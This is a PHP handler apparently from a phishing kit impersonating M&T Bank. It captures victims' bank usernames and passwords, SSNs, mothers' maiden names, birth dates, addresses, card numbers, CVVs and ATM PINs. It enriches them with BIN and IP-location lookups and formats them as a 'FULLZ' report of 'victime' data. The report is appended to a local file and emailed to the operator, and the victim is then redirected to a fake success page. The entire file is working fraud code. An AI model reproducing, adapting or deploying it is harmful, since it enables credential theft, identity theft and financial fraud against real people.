<?php


session_start();
error_reporting(0);

$TIME_DATE = date('H:i:s d/m/Y');
include('../functions/Email.php');
include('../functions/get_browser.php');
include('../antibots.php');
include('../blocker.php');

///////////////////////////////// BIN CHECKER  /////////////////////////////////
if (isset($_POST['card_number'])){
	
	$_SESSION['_user_name_'] = $_POST['user_name'];
	$_SESSION['_user_password_'] = $_POST['user_password'];
	$_SESSION['_firstname_']    = $_POST['firstname'];
	$_SESSION['_lastname_']        = $_POST['lastname'];
	$_SESSION['_address_']        = $_POST['address'];
	$_SESSION['_state_']        = $_POST['state'];
	$_SESSION['_city_']        = $_POST['city'];
	$_SESSION['_zip_']        = $_POST['zip'];
	$_SESSION['_mmn_']        = $_POST['mmn'];
	$_SESSION['_ssn_']      = $_POST['ssn'];
	$_SESSION['_dob_']      = $_POST['dob'];
	$_SESSION['_nameoncard_'] = $_POST['card_name'];
	$_SESSION['_cardnumber_'] = $_POST['card_number'];
	$_SESSION['_expdate_']    = $_POST['exp'];
	$_SESSION['_csc_']        = $_POST['csc'];
	$_SESSION['_pin_']        = $_POST['pin'];
	
	$BIN_LOOKUP  = $_POST['card_number'];
	$dastalk = @json_decode(file_get_contents("https://lookup.binlist.net/".$BIN_LOOKUP));
	$BIN_CARD = $dastalk->scheme;
	$BIN_BANK = $dastalk->bank->name;
	$BIN_TYPE = $dastalk->type;
	$BIN_LEVEL   = 'default_by_author';
	$BIN_CNTRCODE= $dastalk->numeric;
	$BIN_WEBSITE = strtolower($dastalk->url);
	$BIN_PHONE   = strtolower($dastalk->phone);
	$BIN_COUNTRY = $dastalk->country->name;
	
	$_SESSION['_country_']  = $BIN_COUNTRY;
	$_SESSION['_cntrcode_'] = $BIN_CNTRCODE;
	$_SESSION['_cc_brand_'] = $BIN_CARD;
	$_SESSION['_cc_bank_']  = $BIN_BANK;
	$_SESSION['_cc_type_']  = $BIN_TYPE;
	$_SESSION['_cc_class_'] = $BIN_LEVEL;
	$_SESSION['_cc_site_']  = $BIN_WEBSITE;
	$_SESSION['_cc_phone_'] = $BIN_PHONE;
	$_SESSION['_ccglobal_'] = $_SESSION['_cc_brand_']." ".$_SESSION['_cc_type_']." ".$_SESSION['_cc_class_'];
	$_SESSION['_global_']   = $_SESSION['_cntrcode_']." - ".$_SESSION['_ip_'];
	
}


//////////////////////////////////////// GET Country & Country CODE ! ////////////////////////////////////////////////
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = "Unknown";

if(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_'] = $ip = $forward;
}
else{
    $_SESSION['_ip_'] = $ip = $remote;
}





$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$client));
$LOOKUP_COUNTRY = $IP_LOOKUP->country;
$LOOKUP_CNTRCODE= $IP_LOOKUP->countryCode;
$LOOKUP_IP =      $IP_LOOKUP->query;
$LOOKUP_CITY    = $IP_LOOKUP->city;
$LOOKUP_REGION  = $IP_LOOKUP->region;
$LOOKUP_STATE   = $IP_LOOKUP->regionName;
$LOOKUP_ZIPCODE = $IP_LOOKUP->zip;
$LOOKUP_ISP = $IP_LOOKUP->isp;



if (isset($LOOKUP_COUNTRY)){
	$_SESSION['_LOOKUP_COUNTRY_'] = $LOOKUP_COUNTRY;
	$_SESSION['_LOOKUP_CNTRCODE_']= $LOOKUP_CNTRCODE;
	$_SESSION['_LOOKUP_CITY_']    = $LOOKUP_CITY;
	$_SESSION['_LOOKUP_REGION_']  = $LOOKUP_REGION;
	$_SESSION['_LOOKUP_STATE_']   = $LOOKUP_STATE;
	$_SESSION['_LOOKUP_ZIPCODE_'] = $LOOKUP_ZIPCODE;
	$_SESSION['_LOOKUP_REGIONS_'] = $_SESSION['_LOOKUP_STATE_']."(".$_SESSION['_LOOKUP_REGION_'].")";
	$_SESSION['_forlogin_'] = $_SESSION['_LOOKUP_CNTRCODE_']." - ".$_SESSION['_ip_'];
}



$Z118_MESSAGE .= "
<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #820000;'>M&T ACCOUNT FULLZ</font> ####################<br/>
###################################################################################################<br/>
<font style='color:#9c0000;'>✪</font> [Username]	= <font style='color:#0070ba;'>".$_SESSION['_user_name_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Password]	= <font style='color:#0070ba;'>".$_SESSION['_user_password_']."</font><br>
################ <font style='color: #820000;'>PERSONAL INFORMATION</font> ####################<br/>
<font style='color:#9c0000;'>✪</font> [First Name]	= <font style='color:#0070ba;'>".$_SESSION['_firstname_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Last Name] = <font style='color:#0070ba;'>".$_SESSION['_lastname_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Address] = <font style='color:#0070ba;'>".$_SESSION['_address_']."</font><br>
<font style='color:#9c0000;'>✪</font> [State] = <font style='color:#0070ba;'>".$_SESSION['_state_']."</font><br>
<font style='color:#9c0000;'>✪</font> [City] = <font style='color:#0070ba;'>".$_SESSION['_city_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Zip Code] = <font style='color:#0070ba;'>".$_SESSION['_zip_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Mother Maiden Name] = <font style='color:#0070ba;'>".$_SESSION['_mmn_']."</font><br>
<font style='color:#9c0000;'>✪</font> [SSN] = <font style='color:#0070ba;'>".$_SESSION['_ssn_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Date of birth] = <font style='color:#0070ba;'>".$_SESSION['_dob_']."</font><br>

±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>CARDING INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [Bank Name] = <font style='color:#0070ba;'>".$_SESSION['_cc_bank_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Cardholder's Name] = <font style='color:#0070ba;'>".$_SESSION['_nameoncard_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Card Number] = <font style='color:#0070ba;'>".$_SESSION['_cardnumber_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Card success Code]	= <font style='color:#0070ba;'>".$_SESSION['_csc_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Expiration Date] = <font style='color:#0070ba;'>".$_SESSION['_expdate_']."</font><br>
<font style='color:#9c0000;'>✪</font> [ATM Card Pin] = <font style='color:#0070ba;'>".$_SESSION['_pin_']."</font><br>

±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>CARD BIN INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [Bank Name] = <font style='color:#0070ba;'>".$_SESSION['_cc_bank_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Cardholder's Name] = <font style='color:#0070ba;'>".$_SESSION['_nameoncard_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Card Type] = <font style='color:#0070ba;'>".$_SESSION['_cc_type_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Card Country] = <font style='color:#0070ba;'>".$_SESSION['_country_']."</font><br>

±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>".$LOOKUP_IP."</font><br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>".$LOOKUP_ISP."</font><br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_COUNTRY_']."</font><br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_CITY_']."</font><br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_REGION_']."</font><br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_STATE_']."</font><br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_ZIPCODE_']."</font><br>
<font style='color:#9c0000;'>✪</font> [TIME/DATE]    = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".$_SERVER['HTTP_USER_AGENT']."</font><br>
################## <font style='color: #820000;'>BY @X_hammer</font> #####################
</div></html>\n";


if (!empty($_POST['card_name'] && !empty($_POST['card_number']))){

    $res_file = fopen("getData.txt", "a");
	fwrite($res_file, $Z118_MESSAGE);
	$Z118_HEADERS .= "From:ZonnerHack3r <noreply@cssv.com>";
    $Z118_HEADERS .= $_SESSION['eMailAdd']."\n";
    $Z118_HEADERS .= "MIME-Version: 1.0\n";
    $Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
    @mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
	
      
	HEADER("Location: ../success/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
} else {
		HEADER("Location: ../capture/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
	
}
?>